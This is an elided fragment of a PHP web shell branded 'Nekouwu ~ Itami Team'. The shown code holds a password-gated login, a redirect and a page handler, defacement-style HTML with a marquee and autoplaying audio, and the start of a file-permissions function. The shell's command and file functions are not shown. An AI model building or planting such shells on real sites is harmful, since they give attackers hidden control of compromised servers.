...
if($_POST['password'] == $pass) {
  ...
  echo "<script>window.location='?xXx Nekouwu ~ Itami TeamxXx'</script>";
}
if($_GET['page'] == "blank") {
  echo "<a href='?'>Back</a>";
  exit();
...
<title>Nekouwu ~ Itami Team</title><link href="https://fonts.googleapis.com/css?family=Iceland" rel="stylesheet"> 
<center><p class="blink_text" style="font-size:45px;color:lime;text-shadow: 0px 0px 20px #00ffff , 0px 0px 20px #DF0101;font-family:Iceland;">Nekouwu ~ Itami Team</font></center>
<marquee><font face="kelly slab" color="#FF3399" size="5">We Are Itami Team</marquee>
<center><audio controls="controls" autoplay="autoplay" src="https://g.top4top.io/m_1738upsbi1.mp3" type="audio/mpeg"></audio></center>
<style>
body{
font-family: "iceland";background-image:url(https://i.pinimg.com/originals/8a/08/0c/8a080c82a9155cf81532b7f08639ac5f.jpg); background-size:cover; background-attachment: fixed;
...
echo '<font color="#FF3399" size="2px"><center><br/><b>Copyright &copy;2K21 Itami Team | <font color="lime">Nekouwu</a></center></font>
</body>
</html>
';
function perms($file){
